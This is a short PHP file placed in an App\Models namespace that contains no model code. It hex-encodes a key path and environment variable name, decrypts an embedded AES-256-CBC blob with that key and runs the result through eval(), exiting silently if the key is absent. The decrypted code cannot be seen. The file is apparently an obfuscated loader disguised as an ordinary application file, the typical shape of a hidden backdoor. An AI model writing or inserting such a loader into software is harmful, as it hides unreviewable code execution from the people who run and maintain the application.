<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('V2ekCV6T4WEFN1q5HWmraw==');
$c=base64_decode(
'm8iGVcUgeBMRP9E6U3mq05zYbtRg3uzMutQsHc8pcYDgxbv+u4/AtQ6zw3To7cRbHhpkNZ4efvyO' .
'1URgEzQuWnhEQxEu6vooswC9GQle8kEUPaQoE7Qc3P/xTsXD29lB1LuNu5ygVNyCBRjbNKQOLW5A' .
'4YDfucA9bMTnsGowW7JpX/r0Phc37p41bcUGlmW45hnpEXU5CcJeGU3iTqXCyFE9feoS0BavMuZw' .
'gsqeVaK3z5WiQ8FLy/4mLdL0t7D563lxc1FE+pzeEEOR55pyQMMAzopV7purGLhyAl4u8BltNLrO' .
'9ZVYod4+HenFPbSTQBqsstOT8q0BOWI3mq2gHWDE/90+gcEvcJuXIR+iR6Dqo3mbri6nCl0ltwpx' .
'QeDRo41d18l5QAj7kgtNU0X4aZVWwXJ/001Sd+BUhBAPF3o/93eekpoVXzLNEQo1jGgMV0j+dKNW' .
'UA2VEn/g4x+G2zq8/0CW+lySL01kJo99hncoUGzInaekWWTO5r7IONgA1dZaqCK4rRU+kzWVlnDu' .
'JY8KqPzkAsWuDWOhmaKBO9+dTX+SpYwzjJeIONEU2a1DByXZQYjvUSC9QR/XHt6o21gS1Er9myx3' .
'bqB7aIdQn6zYYPJI001GZqWVYQNoT5bTQL4cic0KQpNg8SZ8qrpFsQXGL/R4+Kz7mV7v8YJRFNnN' .
'H2v8dItBI5yWH5Pq4+Z+KvvCTA03/LgGIizWDMZkz97G4hdV+SGcg3W1QyLPRDxyN1u5lG7NNitI' .
'4oVizUZbut4ZEkZLfaeMIok0BRH4sw38j+sj4+ewLPLj31Na9Cb1xuAcwxei33l7p6RdIny/92fw' .
'glc/r+PT6jbX+yNWYobGct1ICsMLjuEOpq2umWYb/BIDN8Bf5zEvsHNEEt43rgNnOSNvU15JPv6N' .
'j66RtQ=='
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
